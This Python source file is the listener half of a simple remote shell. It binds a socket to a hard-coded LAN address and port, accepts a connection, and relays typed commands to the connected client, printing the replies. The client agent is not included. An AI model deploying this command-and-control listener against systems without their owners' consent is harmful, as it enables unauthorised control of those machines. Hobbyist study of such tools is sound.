import socket
import sys


def send_commands(s, conn):
    """Take a command typed by the user and send it to the client"""
    print("\nCtrl + C to close the connection")
    print("Navigate the system as usual with cd. ")
    print("$: ", end="")
    while True:
        try:
            cmd = input()
            if len(cmd) > 0:
                conn.sendall(cmd.encode())
                data = conn.recv(4096)
                print(data.decode("utf-8"), end="")
        except KeyboardInterrupt:
            print("\nA presto. ")
            conn.close()
            s.close()
            sys.exit()
        except Exception as e:
            print(e)
            conn.close()
            s.close()
            sys.exit()


def server(address):
    """Initialize a socket server and wait for a connection"""
    try:
        s = socket.socket()
        s.bind(address)
        s.listen()
        print("Server initialized. I'm listening ...")
    except Exception as e:
        print("\nLooks like something went wrong. ")
        print(e)
        restart = input("\nDo you want me to reinitialize the server? y/n ")
        if restart.lower() == "y" or restart.lower() == "yes":
            print("\nReceived. I'm reinitializing the server... \n")
            server(address)
        else:
            print("\nSee you soon, and Happy Coding! ;) \n")
            sys.exit()
    conn, client_address = s.accept()
    print(f"Connection established: + {client_address}")
    send_commands(s, conn)


if __name__ == "__main__":
    host = "192.168.1.26"
    port = 19874
    server((host, port))
